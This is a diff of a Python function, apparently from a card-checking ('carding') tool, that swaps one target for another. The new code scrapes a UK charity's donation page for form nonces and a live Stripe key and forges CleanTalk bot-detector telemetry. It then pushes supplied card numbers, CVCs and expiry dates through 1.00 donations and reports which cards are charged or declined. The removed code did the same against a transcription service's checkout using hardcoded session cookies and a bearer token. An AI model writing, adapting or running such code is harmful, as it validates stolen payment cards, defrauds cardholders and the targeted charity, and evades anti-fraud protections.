@@ -1056,90 +1056,241 @@ def Telev(ccx):
 	sess = generate_random_code()
 	
 	headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-}
-	
-	data = f'type=card&billing_details[name]=JOKERT&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=8313867e-642b-45f1-a1ac-8d16e62b2804f1eeb1&muid=f4fe562c-c20a-495a-ae53-c7f98af7fd7796a997&sid=885656e7-3f03-400b-8506-a306d215a0fd8a73a8&pasted_fields=number&payment_user_agent=stripe.js%2F20e004c1e5%3B+stripe-js-v3%2F20e004c1e5&time_on_page=235334&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'
-
-	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	id=response.json()['id']
-	import requests
-	
-	cookies = {
-    'ahoy_visitor': '3aae0976-e23a-4dba-8b36-8472d208de39',
-    '_gcl_au': '1.1.589615022.1686364822',
-    '_gid': 'GA1.2.612414710.1686364822',
-    '_lfa': 'LF1.1.33f2f8d8020e1717.1686364822829',
-    '_fbp': 'fb.1.1686364827355.914507822',
-    'cookieconsent_status': 'dismiss',
-    'intercom-device-id-frdatdus': '880e973e-b4f6-4a1b-bda6-5c8c42734d2b',
-    '__stripe_mid': 'ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd',
-    'ahoy_visit': '6daa3b7e-b32a-4535-a6c8-a3d04e9480c3',
-    '_uetsid': '25876ee0073811ee82092b2ec7ac516d',
-    '_uetvid': '25886a50073811eeb998adc6e5b32b9c',
-    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e',
-    'unsecure_is_signed_in': '1',
-    '_ga_4T8KCV9Y2D': 'GS1.1.1686415944.3.1.1686416484.0.0.0',
-    '_ga': 'GA1.1.1778485401.1686364822',
-    'intercom-session-frdatdus': 'ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6',
-    '_transcribe_session': '9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
-}
-	
+            'authority': 'www.foursquare.org.uk',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+	response = s.get('https://www.foursquare.org.uk/donate/', headers=headers)
+	post = re.search(r'name="post_id"\s+value="([^"]+)"', response.text).group(1)
+	form = re.search(r'name="form_id"\s+value="([^"]+)"', response.text).group(1)
+	refer = re.search(r'name="referer_title"\s+value="([^"]+)"', response.text).group(1)
+	queried = re.search(r'name="queried_id"\s+value="([^"]+)"', response.text).group(1)
+	char_form = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', response.text).group(1)
+	nonce = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text).group(1)
+	camp = re.search(r'name="campaign_id"\s+value="([^"]+)"', response.text).group(1)
+	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
+	if not all([post, form, refer, queried, char_form, nonce, camp, pk_live2]):
+		return (f"Error in get values")
 	headers = {
-    'authority': 'www.happyscribe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-    'authorization': 'Bearer I5PqUERRXMbQyALPKtQFzQtt',
-    'content-type': 'application/json',
-    # 'cookie': 'ahoy_visitor=3aae0976-e23a-4dba-8b36-8472d208de39; _gcl_au=1.1.589615022.1686364822; _gid=GA1.2.612414710.1686364822; _lfa=LF1.1.33f2f8d8020e1717.1686364822829; _fbp=fb.1.1686364827355.914507822; cookieconsent_status=dismiss; intercom-device-id-frdatdus=880e973e-b4f6-4a1b-bda6-5c8c42734d2b; __stripe_mid=ede0d795-7f30-4e51-a91e-0210f5a23951b84bfd; ahoy_visit=6daa3b7e-b32a-4535-a6c8-a3d04e9480c3; _uetsid=25876ee0073811ee82092b2ec7ac516d; _uetvid=25886a50073811eeb998adc6e5b32b9c; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOall4TmpJMVhTd2lKREpoSkRFeEpFTkdaSE5qTGxFeGREVXhTRmRtTUZOUVkwMHhOQzRpTENJeE5qZzJOREF6TWpNekxqa3lNVFl5TVRZaVhRPT0iLCJleHAiOiIyMDIzLTA2LTI0VDEzOjIwOjMzLjkyMVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ad6985a88a2a9622429f3e4a8cd92914881dbd8e; unsecure_is_signed_in=1; _ga_4T8KCV9Y2D=GS1.1.1686415944.3.1.1686416484.0.0.0; _ga=GA1.1.1778485401.1686364822; intercom-session-frdatdus=ZlBhWHJmdzExUGZPQnUvQlZpR0NPUTV1OTlCZ3pheXBhU3owRmZkVnZHSTd0Z3BjWkdkVU9oSktMNlhtS0U3YS0tTjI5U2ppa0hJVTFHWTkwQW8yLzJKUT09--de52f1f50324ed0c0480b7dd136dd662fdc2bcf6; _transcribe_session=9ltSCWq4%2F8paV%2Ba7Q%2BsSpxq%2BUo9d9Qb52UUgag2y0TjFmb4hiVEUOBbxA%2BY6XXM%2FOcGtCOR5fVy2a%2BBvmFIIzx3TMXk6NPt%2B63LrXQhWHJI%2F%2BL3FquwpWT6Ut6XCsmvTL663PW6yIiOSGH%2FsJx%2FkItolUtzMChixWlik1oq%2FYgLeHbQ7P7uQGecOlnrEfGuHvtQsu%2FNGEP32udOn8hTMLLF5JVcNe%2BsL3ym4egtgkm1t6admB3UigbdhyQ58tyt8DuCacNRbAaqwprlepGqoqndCbcxFH%2BFmpV9uH%2Fr22SxZ%2B2bOSrUAYfKYmw0hpdpygqLOh1Zl2chESEmCdYNQfTSH9kFjJmd9PVbL36fXn3kXhf0H3ZDWmWpdtF7dAmj18ar0eMHb%2BY6NmGaIMzhSbQ5ULw%3D%3D--vy%2FHrQ6eJSHeL3Yq--YPDdApVNaCOsOicbtbZ1gQ%3D%3D',
-    'origin': 'https://www.happyscribe.com',
-    'referer': 'https://www.happyscribe.com/v2/7592712/checkout?plan=slider_prepaid&hours=1',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-}
-	
+            'authority': 'www.foursquare.org.uk',
+            'accept': '*/*',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarykOFYuDpYc9x9HRaR',
+            'origin': 'https://www.foursquare.org.uk',
+            'referer': 'https://www.foursquare.org.uk/donate/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+
+	files = {
+            'email': (None, email),
+        }
+
+	response = s.post(
+            'https://www.foursquare.org.uk/wp-json/cleantalk-antispam/v1/check_email_before_post',
+            headers=headers,
+            files=files,
+        )
+	headers = {
+            'authority': 'fd.cleantalk.org',
+            'accept': '*/*',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://www.foursquare.org.uk',
+            'referer': 'https://www.foursquare.org.uk/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+        
 	json_data = {
-    'id': 7271786,
-    'address': 'NEW YORK',
-    'name': 'JOhdjkdR',
-    'country': 'US',
-    'vat': None,
-    'billing_account_id': 7271786,
-    'orderReference': 'orrbctwnb',
-    'user_id': 7661625,
-    'organization_id': 7592712,
-    'hours': 1,
-    'balance_increase_in_cents': None,
-    'payment_method_id': id,
-    'transcription_id': None,
-    'plan': 'slider_prepaid',
-    'order_id': None,
-    'recurrence_interval': None,
-    'extra_plan_hours': None,
-}
-	response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
+            'js_event': 'submit',
+            'page_url': 'https://www.foursquare.org.uk/donate/',
+            'data': {
+                'agent': 'bot_detector_1.1.59',
+                'timestamp': int(time.time()),
+                'bot_detector_list_keys_pressed': {
+                    'key_esc_pressed': False,
+                    'key_backspace_pressed': True,
+                    'key_capslock_pressed': False,
+                    'key_shift_ctrl_pressed': False,
+                    'key_shift_alt_pressed': False,
+                    'key_mobile_capslock_pressed': False,
+                },
+                'headless': False,
+                'page_hits': 1,
+                'has_scrolled': True,
+                'mouse_moved': True,
+                'pointer_data': [[599, 239, 3479], [588, 197, 8839]],
+                'screen_info': {
+                    'fullWidth': 360,
+                    'fullHeight': 10873,
+                    'visibleWidth': 360,
+                    'visibleHeight': 714,
+                },
+                'user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+                'REFFERRER': 'https://www.foursquare.org.uk/donate/',
+                'REFFERRER_PREVIOUS': '',
+                'cookies_enabled': True,
+                'has_input_focused': True,
+                'has_key_up': True,
+                'webgl': True,
+                'scrolling_additional': [],
+                'typo': [],
+            },
+            'method_name': 'frontend_data',
+        }
+        
+	response = s.post('https://fd.cleantalk.org/api3.0/frontend_data', headers=headers, json=json_data)
 	try:
-		if "insufficient funds" in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text:
-			print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['error'])
-		else:
-			print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['error'])
+		event = response.json()['event_token']
+	except (KeyError, json.JSONDecodeError):
+		return ("Card Error")
+	headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+        
+	data = {
+            'type': 'card',
+            'billing_details[name]': 'haha jahahaj',
+            'billing_details[email]': 'tomee1@gmail.com',
+            'billing_details[address][line1]': 'steer 62888',
+            'billing_details[address][postal_code]': '10080',
+            'card[number]': n,
+            'card[cvc]': cvc,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'guid': str(uuid.uuid4()),
+            'muid': str(uuid.uuid4()),
+            'sid': str(uuid.uuid4()),
+            'payment_user_agent': 'stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; card-element',
+            'referrer': 'https://www.foursquare.org.uk',
+            'time_on_page': '100659',
+            'key': pk_live2,
+        }
+        
+	response = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	try:
+		pm = response.json()['id']
+	except (KeyError, json.JSONDecodeError):
+		return (f"Error: {response.text}")
+	headers = {
+            'authority': 'www.foursquare.org.uk',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://www.foursquare.org.uk',
+            'referer': 'https://www.foursquare.org.uk/donate/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+	data = {
+            'charitable_form_id': char_form,
+            f'{char_form}': '',
+            '_charitable_donation_nonce': nonce,
+            '_wp_http_referer': '/donate/',
+            'campaign_id': camp,
+            'description': 'Four Square Donation',
+            'ID': '0',
+            'gateway': 'stripe',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'recurring_donation': 'once',
+            'title': 'Mr',
+            'first_name': 'exeee',
+            'last_name': 'waysss',
+            'email': email,
+            'address': 'steer 62888',
+            'postcode': '10080',
+            'tax_disclaimer': '',
+            'stripe_payment_method': pm,
+            'ct_bot_detector_event_token': event,
+            'action': 'make_donation',
+            'form_action': 'make_donation',
+        }
+        
+	response = s.post('https://www.foursquare.org.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response_text = response.text
+	if 'succeeded' in response_text:
+		return (f"Charge 1.00$")
+	elif 'Your card was declined.' in response_text:
+		return (f"Your card was declined.")
+	elif 'Your card number is incorrect.' in response_text:
+		return(f"Your card number is incorrect.")
+	else:
+		try:
+			error_msg = response.json()
+			eeee=(f"{error_msg}")
+		except:
+			eeee=(f"{response_text[:200]}")
+	try:
+	    exe = response.json()
 	except:
-		print(response.text)
+	    print("Error in last req")
+	try:
+		secret_key=exe.get('secret')
+		pi_id = secret_key.split('_secret')[0]
+	except:
+	   print(eeee)
+	   return "Error in get sec"
+	headers = {
+	        'accept': 'application/json',
+	        'accept-language': 'tr-AZ,tr;q=0.9,az-AZ;q=0.8,az;q=0.7,en-US;q=0.6,en;q=0.5',
+	        'content-type': 'application/x-www-form-urlencoded',
+	        'origin': 'https://js.stripe.com',
+	        'priority': 'u=1, i',
+	        'referer': 'https://js.stripe.com/',
+	        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+	        'sec-ch-ua-mobile': '?0',
+	        'sec-ch-ua-platform': '"Windows"',
+	        'sec-fetch-dest': 'empty',
+	        'sec-fetch-mode': 'cors',
+	        'sec-fetch-site': 'same-site',
+	        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+	    }
+	con = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
+	condat = f'expected_payment_method_type=card&use_stripe_sdk=true&key={pk_live2}&client_secret={secret_key}'
+	fin = s.post(con, headers=headers, data=condat)
+	mssgg=fin.json()
+	if 'Insufficient funds' in mssgg or 'fund' in mssgg:
+	    return 'Insufficient funds'
+	if mssgg.get("status") == "succeeded":
+	    return "Charge ✅"
+	else:
+	    err = mssgg.get("error", {})
+	    decline = (err.get("decline_code")
+	or err.get("code")
+	or err.get("payment_intent", {})
+	    .get("last_payment_error", {})
+	    .get("decline_code"))
+	    return decline or "Unknown error"
+
